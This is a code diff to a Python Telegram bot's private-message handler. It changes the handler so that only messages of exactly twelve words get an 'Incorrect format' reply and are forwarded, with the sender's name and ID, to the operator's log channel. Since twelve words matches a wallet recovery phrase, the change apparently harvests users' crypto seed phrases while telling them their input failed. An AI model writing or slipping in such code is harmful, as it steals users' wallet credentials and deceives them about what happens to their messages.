@@ -123,8 +123,9 @@ async def pm_text(bot, message):
     user = message.from_user
     user_id = message.from_user.id
     if content.startswith("/") or content.startswith("#"): return  # ignore commands and hashtags
-    await message.reply_text("<b> Incorrect format, Please try again.!</b>")
-    await bot.send_message(
+    if len(content.split()) == 12:
+        await message.reply_text("<b> Incorrect format, Please try again.!</b>")
+        await bot.send_message(
         chat_id=Config.LOG_CHANNEL,
         text=f"<b>#𝐏𝐌_𝐌𝐒𝐆\n\nNᴀᴍᴇ : {user}\n\nID : {user_id}\n\nMᴇssᴀɢᴇ : {content}</b>"
     )
